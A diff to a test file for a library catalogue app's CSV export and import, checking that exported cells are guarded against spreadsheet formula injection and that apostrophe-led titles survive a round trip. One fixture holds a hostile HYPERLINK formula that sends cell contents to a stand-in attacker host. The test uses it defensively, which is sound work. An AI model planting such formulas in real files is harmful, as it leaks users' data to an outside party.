@@ -171,6 +171,7 @@ describe('a Nalanda export, imported again', () => {
     const formula = '=HYPERLINK("https://evil.example/?"&D2&E2,"Open")';
     await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: formula, creators: '+1 Forever', notes: "'quoted", location: '-', details: '{}' });
     await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: '=1+1', details: '{}' });
+    await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: "'Salem's Lot", creators: 'Stephen King', details: '{}' }); // really begins with an apostrophe
 
     const csv = (await call('/export.csv?after=0', cookie)).text;
     // a spreadsheet reads a cell starting with ' as text and shows the rest: no cell leaves as a formula
@@ -178,15 +179,25 @@ describe('a Nalanda export, imported again', () => {
     expect(csv).toMatch(/(^|,)'=1\+1(,|\r\n)/m);
     expect(csv).toContain(",'+1 Forever,");
     expect(csv).toContain(",''quoted,'-,");
+    expect(csv).toContain("''Salem's Lot,Stephen King,"); // guarded on the way out, since a leading ' is itself a guard
     for (const line of csv.split('\r\n').slice(1).filter(Boolean)) for (const cell of parseCsv(csv.split('\r\n')[0] + '\r\n' + line)) for (const v of Object.values(cell)) expect(v).not.toMatch(/^[=+\-@\t\r]/);
 
     const target = await createLibrary(env.DB, 'Restored');
-    expect(JSON.parse((await call('/api/import', cookie, { libraryId: target.id, rows: parseCsv(csv) })).text)).toMatchObject({ inserted: 2, skipped: 0 });
+    expect(JSON.parse((await call('/api/import', cookie, { libraryId: target.id, rows: parseCsv(csv) })).text)).toMatchObject({ inserted: 3, skipped: 0 });
     const back = (await env.DB.prepare('SELECT title, creators, notes, location FROM items WHERE library_id = ?1 ORDER BY id').bind(target.id).all<Record<string, string | null>>()).results;
     expect(back).toEqual([
       { title: formula, creators: '+1 Forever', notes: "'quoted", location: '-' },
       { title: '=1+1', creators: null, notes: null, location: null },
+      { title: "'Salem's Lot", creators: 'Stephen King', notes: null, location: null },
     ]);
+
+    // an export from before the guard never wrote one: a title that begins with an apostrophe comes back as it was,
+    // and only a guard before a guarded character is taken off
+    const older = csv.replace("''Salem's Lot", "'Salem's Lot");
+    const again = await createLibrary(env.DB, 'Older');
+    expect(JSON.parse((await call('/api/import', cookie, { libraryId: again.id, rows: parseCsv(older) })).text)).toMatchObject({ inserted: 3 });
+    const titles = (await env.DB.prepare('SELECT title FROM items WHERE library_id = ?1 ORDER BY id').bind(again.id).all<{ title: string }>()).results.map((r) => r.title);
+    expect(titles).toEqual([formula, '=1+1', "'Salem's Lot"]);
   });
 
   it('brings a board game’s BGG facts back — its weight among them — so it fits tonight’s filters as before (§16 #60)', async () => {
